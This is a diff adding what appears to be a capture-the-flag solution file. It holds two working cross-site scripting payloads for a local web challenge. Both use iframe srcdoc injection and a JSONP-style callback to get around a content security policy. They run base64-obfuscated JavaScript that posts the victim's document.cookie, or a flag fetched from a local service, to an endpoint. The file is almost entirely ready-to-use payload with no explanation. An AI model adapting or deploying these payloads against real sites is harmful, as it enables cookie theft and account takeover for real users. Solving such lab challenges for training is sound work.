@@ -1,0 +1,7 @@
+./docker_run.sh localhost
+
+flag1:
+<iframe/srcdoc='<script/src="//localhost:9999/js?cb=script2%3Ddocument.createElement(%60script%60)%2Cscript2.type%3D%60text%2Fjavascript%60%2Cscript2.appendChild(document.createTextNode(%60eval(atob(%5C%60dmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpO3hoci5vcGVuKCJQT1NUIiwgImh0dHA6Ly9sb2NhbGhvc3Q6OTk5OS9hZGQiLCB0cnVlKTt4aHIuc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC1UeXBlIiwgImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIpO3hoci5zZW5kKGBhdXRob3I9dGVzdCZib2R5PSR7ZG9jdW1lbnQuY29va2llfWApOw%3d%3d%5C%60))%60))%3Biframe%3Ddocument.createElement(%60iframe%60)%2Ciframe.src%3DString.fromCharCode(0x2f%2C0x25)%2Ciframe.id%3D%60csp-out%60%2Cdocument.head.appendChild(iframe)%3Bdocument.getElementById(%60csp-out%60).contentDocument.body.appendChild(script2)%3B"></script>'></iframe>
+
+flag2 - a nice solution by https://www.linkedin.com/in/m-nicolaides
+<iframe srcdoc="<script src=http://localhost:9999/js?cb=script=document.createElement('script');script.src='http://localhost:9999/js?cb=eval(atob(`ZmV0Y2goJ2h0dHA6Ly8xMjcuMC4wLjE6MTMzNy9mbGFnJykudGhlbihmdW5jdGlvbihyZXNwb25zZSl7cmV0dXJuLyoqL3Jlc3BvbnNlLnRleHQoKTt9KS50aGVuKGZ1bmN0aW9uKGRhdGEpe2NvbnNvbGUubG9nKGRhdGEpO2ZsYWc9ZGF0YTtyZXR1cm4vKiovZmV0Y2goJ2h0dHA6Ly9sb2NhbGhvc3Q6OTk5OS9hZGQnLHttZXRob2Q6J1BPU1QnLGhlYWRlcnM6eydDb250ZW50LVR5cGUnOidhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnfSxyZWZlcnJlcjonJyxib2R5OidhdXRob3I9dGVzdCZib2R5PScrZmxhZ30pO30p`));';setTimeout(function(){window.frames[0].document.head.appendChild(script)},3000);></script><iframe src='/manifest.json'></iframe>"></iframe>
